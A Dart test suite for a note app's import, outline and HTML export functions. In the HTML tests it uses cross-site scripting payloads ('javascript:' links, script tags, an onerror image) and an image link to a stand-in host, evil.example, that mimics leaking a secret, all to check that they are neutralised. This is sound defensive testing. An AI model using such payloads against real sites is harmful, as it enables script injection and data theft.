import 'dart:io';

import 'package:notelore_core/src/store/format.dart';
import 'package:notelore_core/src/store/transfer.dart';
import 'package:path/path.dart' as p;
import 'package:test/test.dart';

String fixture(String name) =>
    File(p.join('..', '..', 'spec', 'fixtures', 'notes', name)).readAsStringSync();

void main() {
  late Directory root;
  setUp(() => root = Directory.systemTemp.createTempSync('notelore_transfer_'));
  tearDown(() => root.deleteSync(recursive: true));

  String read(String rel) => File(p.join(root.path, rel)).readAsStringSync();
  List<String> files() => [
    for (final f in root.listSync(recursive: true).whereType<File>())
      p.relative(f.path, from: root.path).replaceAll(r'\', '/'),
  ]..sort();

  group('import', () {
    test('a new note comes in as it was sent, byte for byte', () {
      final mopsos = fixture('mopsos.md');
      final result = importNote(root.path, mopsos);
      expect(result.outcome, ImportOutcome.added);
      expect(result.title, 'Mopsos');
      expect(p.relative(result.path, from: root.path).replaceAll(r'\', '/'), 'projects/mopsos.md');
      expect(read('projects/mopsos.md'), mopsos);
    });

    test('the same note again changes nothing', () {
      importNote(root.path, fixture('mopsos.md'));
      final again = importNote(root.path, fixture('mopsos.md'));
      expect(again.outcome, ImportOutcome.alreadyThere);
      expect(files(), ['projects/mopsos.md']);
    });

    test('CRLF and NFD from another device count as the same note, stored as LF NFC', () {
      final turkish = fixture('turkish.md');
      final sent = turkish.replaceAll('\n', '\r\n').replaceAll('ş', 'ş');
      expect(importNote(root.path, sent).outcome, ImportOutcome.added);
      expect(read('topics/sirket-kurulusu.md'), turkish);
      expect(importNote(root.path, turkish).outcome, ImportOutcome.alreadyThere);
    });

    test('a different note with a taken name comes in beside it, never over it', () {
      final mine = fixture('mopsos.md');
      importNote(root.path, mine);
      final theirs = mine.replaceFirst('Single user, zero setup.', 'Their own reason.');
      final second = importNote(root.path, theirs);
      expect(second.outcome, ImportOutcome.renamed);
      expect(second.title, 'Mopsos (2)');
      expect(read('projects/mopsos.md'), mine); // untouched
      final copy = parse(read('projects/mopsos-2.md'));
      expect(copy.title, 'Mopsos (2)');
      expect(copy.heading, 'Mopsos (2)');
      // Everything else as it was sent.
      expect(read('projects/mopsos-2.md').replaceAll('Mopsos (2)', 'Mopsos'), theirs);
      final third = importNote(root.path, theirs.replaceFirst('React', 'Svelte'));
      expect(third.title, 'Mopsos (3)');
      // Their note sent again is recognized under its new name too.
      expect(importNote(root.path, theirs).outcome, ImportOutcome.alreadyThere);
      expect(files(), ['projects/mopsos-2.md', 'projects/mopsos-3.md', 'projects/mopsos.md']);
    });

    test('anything that is not a Notelore note is refused and nothing is written', () {
      expect(() => importNote(root.path, 'just some text'), throwsA(isA<NotANote>()));
      final odd = fixture('mopsos.md').replaceFirst('kind: project', 'kind: recipe');
      expect(() => importNote(root.path, odd), throwsA(isA<NotANote>()));
      expect(files(), isEmpty);
    });
  });

  group('outline (what a PDF shows)', () {
    test('title, a meta line, sections and entries, superseded decisions struck', () {
      final lines = outline(fixture('mopsos.md'));
      String show(OutlineLine l) => '${l.style.name}${l.struck ? '~' : ''}: ${l.text}';
      expect(lines.map(show), [
        'title: Mopsos',
        'meta: project · investing, side-project · 2026-09-12 – 2026-09-30',
        'heading: Decisions',
        'item~: 2026-09-12 — database: PostgreSQL. (superseded 2026-09-28)',
        'item: 2026-09-28 — database: SQLite. Single user, zero setup.',
        'item: 2026-09-20 — frontend: React + Vite.',
        'heading: Notes',
        'item: 2026-09-15: Prediction hit rate is calculated weekly, on Sundays.',
        'item: 2026-09-22: Considered adding crypto, postponed until the stock flow is stable.',
        'heading: Todo',
        'item: [ ] 2026-10-15: Add Drive backup',
        'item: [x] 2026-09-25: Set up CI',
      ]);
    });

    test('reminders show their day and time (#430)', () {
      final lines = outline(fixture('reminders.md')).map((l) => l.text).toList();
      expect(lines, containsAllInOrder(['Reminders', '2026-10-21: Book the photo appointment']));
      expect(
        lines,
        contains('2026-11-03 09:30: Passport office, bring the old passport\nand two photos.'),
      );
    });

    test('loose lines, multi-line entries and empty sections keep their text', () {
      final lines = outline(fixture('multiline-and-loose-lines.md'));
      expect(lines.first.style, LineStyle.title);
      expect(lines.where((l) => l.text.contains('\n')), isNotEmpty); // continuation lines
      expect(lines.where((l) => l.text.trim().isEmpty), isEmpty); // blank lines dropped
      final unknown = outline(fixture('unknown-and-empty-sections.md'));
      expect(unknown.where((l) => l.style == LineStyle.heading), isNotEmpty);
    });

    test('a note with no tags and no dates still has a meta line', () {
      final bare = outline('---\ntitle: Bare\nkind: topic\n---\n# Bare\nSome preamble.\n');
      expect(bare.map((l) => '${l.style.name}: ${l.text}'), [
        'title: Bare',
        'meta: topic',
        'text: Some preamble.',
      ]);
    });
  });

  group('html', () {
    test('one page for the notes, readable anywhere, nothing of the note lost', () {
      final page = notesHtml('Notelore', [fixture('mopsos.md'), fixture('turkish.md')]);
      expect(page, startsWith('<!doctype html>'));
      expect(page, contains('<meta charset="utf-8">'));
      expect(page, contains('<title>Notelore</title>'));
      expect(page, contains('<h1>Mopsos</h1>'));
      expect(page, contains('project · investing, side-project · 2026-09-12 – 2026-09-30'));
      expect(page, contains('<del>'));
      expect(page, contains('Şirket Kuruluşu'));
      expect('<article'.allMatches(page), hasLength(2));
    });

    test('only web and mail links stay links; a script link goes nowhere', () {
      final note = fixture('mopsos.md').replaceFirst(
        'Set up CI',
        '[a](javascript:alert(1)) [b](data:text/html,x) [c](https://example.com) '
            '[d](mailto:a@b.c) [e](JAVASCRIPT:alert(2))',
      );
      final page = notesHtml('x', [note]);
      expect(page.toLowerCase(), isNot(contains('javascript:')));
      expect(page, isNot(contains('data:text')));
      expect(page, contains('href="https://example.com"'));
      expect(page, contains('href="mailto:a@b.c"'));
    });

    test('a quote stays a quote; the body starts after the title, not a YAML comment', () {
      final note = fixture('mopsos.md')
          .replaceFirst('kind: project\n', 'kind: project\n# a comment in the front matter\n')
          .replaceFirst('## Decisions', '> Quoted first line.\n\n## Decisions');
      final page = notesHtml('x', [note]);
      expect(page, contains('<blockquote>'));
      expect(page, contains('Quoted first line.'));
      expect(page, isNot(contains('a comment in the front matter')));
      expect('<h1>'.allMatches(page), hasLength(1)); // the title once, from the meta
    });

    test('an image in a note is never loaded: its alt text shows instead (#311)', () {
      final note = fixture('mopsos.md').replaceFirst(
        'Set up CI',
        '![the chart](https://evil.example/leak?d=secret) and ![](http://x.example/p.png)',
      );
      final page = notesHtml('x', [note]);
      expect(page, isNot(contains('<img')));
      expect(page, isNot(contains('evil.example')));
      expect(page, contains('the chart'));
    });

    test('markup inside a note is shown, never run', () {
      final note = fixture('mopsos.md')
          .replaceFirst('Set up CI', '<script>alert(1)</script> <img src=x onerror=alert(2)>');
      final page = notesHtml('<b>x</b>', [note]);
      expect(page, isNot(contains('<script>')));
      expect(page, isNot(contains('<img')));
      expect(page, contains('&lt;script&gt;'));
      expect(page, contains('<title>&lt;b&gt;x&lt;/b&gt;</title>'));
    });
  });
}
